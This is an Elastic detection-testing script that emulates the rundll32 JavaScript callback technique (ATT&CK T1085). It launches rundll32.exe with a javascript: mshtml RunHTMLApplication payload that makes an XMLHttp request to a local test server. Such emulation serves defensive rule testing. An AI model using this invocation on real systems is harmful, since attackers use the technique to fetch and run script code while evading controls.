# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: RunDLL32 Javascript Callback
# RTA: rundll32_javascript_callback.py
# signal.rule.name: Local Service Commands
# signal.rule.name: Potential Modification of Accessibility Binaries
# ATT&CK: T1085
# Description: Executes javascript code with an AJAX call via RunDll32.exe

import logging

from . import OSType, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="75687622-2e75-4612-b213-a31f923efdd4",
    name="rundll32_javascript_callback",
    platforms=[OSType.WINDOWS],
)
def main():
    log.info("RunDLL32 with Javascript Callback")
    server, ip, port = _common.serve_dir_over_http()
    _common.clear_web_cache()

    url = "http://%s:%d" % (ip, port)
    rundll32 = "rundll32.exe"
    js = """
        'javascript:"\\..\\mshtml,RunHTMLApplication ";'
        'var%20xhr=new%20ActiveXObject("Msxml2.XMLHttp.6.0");,'
        'xhr.open("GET", "{url}",false);xhr.send();'
    """.format(
        url=url
    )
    packed_js = "".join(s.strip() for s in js.splitlines())

    _ = _common.execute_command([rundll32, packed_js])
    server.shutdown()
